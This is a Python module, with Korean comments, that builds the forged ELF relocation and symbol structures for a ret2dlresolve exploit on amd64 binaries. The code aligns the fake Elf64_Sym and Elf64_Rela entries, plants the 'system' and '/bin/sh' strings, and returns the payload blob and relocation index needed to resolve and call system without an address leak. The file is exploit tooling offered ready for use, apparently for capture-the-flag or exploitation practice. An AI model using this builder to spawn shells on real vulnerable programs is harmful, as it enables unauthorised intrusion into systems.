"""ret2dlresolve 위조 구조체 빌더 (amd64).

동적 링커의 지연 해석(lazy binding)을 악용해 **leak 없이** 임의 libc 심볼(예:
``system``)을 해석·호출한다. 쓰기 가능 영역에 가짜 ``Elf64_Rela``·``Elf64_Sym``·
문자열을 심고, ``.plt[0]`` 리졸버를 우리가 만든 reloc 인덱스로 호출하면 링커가
그 심볼을 해석해 호출한다.

정렬 규칙이 핵심이다: 가짜 ``Elf64_Sym`` 은 ``.dynsym`` 기준 24바이트 정렬이어야
``sym_index = (addr - dynsym)/24`` 가 정수가 되고, 가짜 ``Elf64_Rela`` 는 ``.rela.plt``
(JMPREL) 기준 24바이트 정렬이어야 ``reloc_arg = (addr - jmprel)/24`` 가 정수가 된다.
이 빌더가 그 정렬을 자동으로 맞춰 배치한다.

.. note::
   glibc 2.34+ 는 심볼 버전 검사로 고전 ret2dlresolve 를 하드닝했다(범위 밖 sym
   인덱스가 ``.gnu.version`` 배열을 벗어나 해석이 실패할 수 있다). 이 빌더는 구조체를
   정확히 만들지만, 실제 셸 획득은 대상 libc 버전에 따라 성립하지 않을 수 있다.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass

# Elf64_Rela / Elf64_Sym 크기(둘 다 24바이트).
_ENT = 24
_R_X86_64_JUMP_SLOT = 7
_STB_GLOBAL_STT_FUNC = 0x12  # st_info


@dataclass
class Ret2dlresolve:
    blob: bytes  # 쓰기 가능 영역(buf)에 그대로 써 넣을 위조 구조체 뭉치.
    reloc_arg: int  # .plt[0] 에 넘길 reloc 인덱스.
    sym_index: int
    binsh_addr: int  # blob 안 "/bin/sh" 문자열의 절대 주소.
    func_str_addr: int  # blob 안 대상 심볼 문자열의 절대 주소.

    def as_dict(self) -> dict:
        return {
            "reloc_arg": self.reloc_arg,
            "sym_index": self.sym_index,
            "binsh_addr_hex": f"0x{self.binsh_addr:x}",
            "func_str_addr_hex": f"0x{self.func_str_addr:x}",
            "blob_len": len(self.blob),
        }


def build_ret2dlresolve(
    *,
    jmprel: int,
    dynsym: int,
    dynstr: int,
    buf: int,
    func: bytes = b"system",
    binsh: bytes = b"/bin/sh",
) -> Ret2dlresolve:
    """``buf`` 에 배치할 위조 구조체 뭉치와 reloc_arg 를 만든다(모두 절대 주소).

    레이아웃(정렬 자동): ``[Elf64_Sym][Elf64_Rela][func 문자열][binsh 문자열]
    [해석 결과가 쓰일 GOT 슬롯]``. ``r_offset`` 은 그 GOT 슬롯(쓰기 가능)이다.
    """

    # 가짜 Elf64_Sym: .dynsym 기준 24 정렬.
    sym_off = (dynsym - buf) % _ENT
    sym_addr = buf + sym_off
    sym_index = (sym_addr - dynsym) // _ENT

    # 가짜 Elf64_Rela: Sym 뒤, .rela.plt(JMPREL) 기준 24 정렬.
    rela_off = sym_off + _ENT
    rela_off += (jmprel - (buf + rela_off)) % _ENT
    rela_addr = buf + rela_off
    reloc_arg = (rela_addr - jmprel) // _ENT

    # 문자열과 GOT 슬롯은 구조체 뒤에 여유 있게 둔다.
    func_off = rela_off + _ENT + 8
    binsh_off = func_off + len(func) + 1
    got_off = binsh_off + len(binsh) + 8
    got_off += (-got_off) % 8  # 8 정렬
    total = got_off + 8

    blob = bytearray(total)
    # Elf64_Sym: st_name(4), st_info(1), st_other(1), st_shndx(2), st_value(8), st_size(8)
    struct.pack_into(
        "<IBBHQQ",
        blob,
        sym_off,
        (buf + func_off) - dynstr,  # st_name = func 문자열의 dynstr 상대 오프셋
        _STB_GLOBAL_STT_FUNC,
        0,
        0,
        0,
        0,
    )
    # Elf64_Rela: r_offset(8), r_info(8), r_addend(8)
    struct.pack_into(
        "<QQQ",
        blob,
        rela_off,
        buf + got_off,  # r_offset = 해석 결과가 쓰일 쓰기 가능 슬롯
        (sym_index << 32) | _R_X86_64_JUMP_SLOT,
        0,
    )
    blob[func_off : func_off + len(func)] = func
    blob[binsh_off : binsh_off + len(binsh)] = binsh

    return Ret2dlresolve(
        blob=bytes(blob),
        reloc_arg=reloc_arg,
        sym_index=sym_index,
        binsh_addr=buf + binsh_off,
        func_str_addr=buf + func_off,
    )


__all__ = ["Ret2dlresolve", "build_ret2dlresolve"]
